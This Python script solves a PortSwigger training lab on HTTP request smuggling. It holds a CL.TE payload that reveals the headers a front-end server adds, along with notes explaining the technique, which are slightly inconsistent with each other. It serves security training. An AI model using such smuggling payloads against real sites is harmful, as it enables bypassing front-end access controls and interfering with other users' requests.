"""
Lab 8: Exploiting HTTP request smuggling to reveal front-end request rewriting
https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
Difficulty: Practitioner

📝 Smuggle a request to an endpoint that ECHOES back whatever headers it
received (commonly /, reflected in a 404 or similar debug-ish response) —
since the smuggled request is actually what the FRONT-END forwarded
(headers added/rewritten and all), its own response reveals exactly what
the front-end injects, e.g. X-Forwarded-For, a rewritten Host, etc.
"""

from utils import send_same_connection, normalize_crlf, log, note, summarize_response

HOST = "YOUR-LAB-ID.web-security-academy.net"

# Smuggle a request whose "body" (actually the front-end's own next real
# request's headers, including anything it adds) gets reflected back by
# hitting a path we know will 404 and echo the full request in its body.
SMUGGLE_PAYLOAD = normalize_crlf("""POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0

POST /ANYTHING HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

search=""".format(host=HOST))

FOLLOWUP = normalize_crlf("""GET / HTTP/1.1
Host: {host}

""".format(host=HOST))


def run():
    note("The smuggled POST /ANYTHING declares a large Content-Length (500)")
    note("but we only send a few bytes — the back-end then appends the NEXT")
    note("real request it receives (our own follow-up, headers and all,")
    note("INCLUDING whatever the front-end added) as the rest of that body.")
    note("If the target reflects unrecognized POST params/search terms back")
    note("in its response, those appended headers become visible there.")

    (r1, _), (r2, _) = send_same_connection(HOST, [SMUGGLE_PAYLOAD, FOLLOWUP])
    summarize_response(r1, "Smuggle request response (check body for reflected headers)")
    print(r1.decode(errors="replace"))


if __name__ == "__main__":
    run()
